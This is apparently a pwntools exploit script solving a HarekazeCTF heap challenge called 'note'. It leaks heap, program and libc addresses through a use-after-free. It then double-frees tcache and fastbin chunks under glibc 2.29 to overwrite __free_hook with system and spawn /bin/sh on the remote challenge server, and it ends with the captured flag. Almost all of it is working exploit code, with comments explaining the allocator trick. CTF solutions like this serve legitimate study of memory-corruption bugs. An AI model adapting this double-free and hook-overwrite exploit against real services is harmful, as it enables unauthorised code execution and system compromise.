from pwn import *


def debug(func):
    def wrapper(*args, **kwargs):
        print '{}({}, {})'.format(func.__name__, str(args), str(kwargs))
        return func(*args, **kwargs)
    return wrapper


@debug
def create(title):
    io.recvuntil('Choice: ')
    io.sendline('1')
    io.recvuntil('Title: ')
    io.sendline(title)


@debug
def write(title, size, content):
    io.recvuntil('Choice: ')
    io.sendline('2')
    io.recvuntil('content: ')
    io.sendline(title)
    io.recvuntil('content: ')
    io.sendline(str(size))
    io.recvuntil('Content: ')
    io.send(content)


@debug
def show(title):
    io.recvuntil('Choice: ')
    io.sendline('3')
    io.recvuntil('content: ')
    io.sendline(title)

    data = io.recvuntil('1').rstrip('1\n')
    return data


@debug
def delete(title):
    io.recvuntil('Choice: ')
    io.sendline('4')
    io.recvuntil('delete: ')
    io.sendline(title)


binpath = './note'
context.binary = binpath
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF(binpath)
libc = elf.libc


gdbscript = '''
pwn
# after menu
b *0x555555555714
set $head=0x555555558080
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote("problem.harekaze.com", 20003)


# leak heap address
create('AAAA')
write('AAAA', 0x48, 'contentA\n')
create('BBBB')
write('BBBB', 0x48, 'contentB\n')

delete('AAAA')
delete('BBBB')
create('CCCC')
create('DDDD')
data = show('CCCC')
print hexdump(data)
addr_heap = u64(data.ljust(8, '\x00')) - 0x290
print 'addr_heap = {}'.format(hex(addr_heap))


leak_i = 0
@debug
def leak(addr_target):
    global leak_i
    create('GGGG')
    payload = 'P' * 0x20 + p64(addr_target)
    write('GGGG', 0x28, payload)
    delete('GGGG')
    create('EEEE')

    # this create will use the same chunk as the content of 'GGGG' which is filled with payload.
    # 'leak_n'->content == addr_target
    # so by showing 'leak_n' we can leak addr_target.
    create('leak' + str(leak_i) * 4)
    data = show('leak' + str(leak_i) * 4)
    leak_i += 1
    return u64(data.ljust(8, '\x00'))

addr_head = leak(addr_heap + 0x2f0)
addr_prog = addr_head - 0x4080
addr_got_free = addr_prog + 0x3f78
print 'addr_prog = {}'.format(hex(addr_prog))

addr_free = leak(addr_got_free)
addr_libc = addr_free - libc.symbols['free']
print 'addr_free = {}'.format(hex(addr_free))
print 'addr_libc = {}'.format(hex(addr_libc))


print 'create chunks to fill tcache[0x40]'
for i in xrange(10):
    title = str(i) * 4
    create(title)
    write(title, 0x38, 'content' + title + '\n')
print 'fill tcache[0x40]'
for i in xrange(7):
    title = str(i) * 4
    delete(title)

print 'use tcache[0x30]'
create('usetcache0')
create('usetcache1')

delete('6666')
print 'double free fastbins'
delete('7777')
create('doublefree')
delete('8888')
delete('doublefree')

for i in xrange(7):
    title = 'a' + str(i)
    create(title)

for i in xrange(7):
    title = 'b' + str(i)
    create(title)
    write(title, 0x38, 'hoge\n')

# When a chunk from fastbin is allocated in _int_malloc,
# it checks whether there is free space in corresponding tcache list.
# If there is free space, _int_malloc will reconnect chunks linked to fastbins to tcachebins.
# So by overwriting double freed target_fb->fd, we can control the target_tcache->next.
# By this we can ignore the fastbins size check.
# (Refer to glibc 2.29 _int_malloc())
print 'overwrite fastbin->fd (& tcachebin->next at the same time)'
create('target1')
write('target1', 0x38, p64(addr_libc + libc.symbols['__free_hook']) + '\n')
create('target2')
write('target2', 0x38, 'consume\n')
create('target3')
write('target3', 0x38, 'consume\n')
create('target4')
write('target4', 0x38, p64(addr_libc + libc.symbols['system']) + '\n')

create('/bin/sh\x00')
delete('/bin/sh\x00')

io.interactive()

# HarekazeCTF{d0u613_fr3e_1n_7c4ch3_15_n0_10ng3r_4va1l4613}
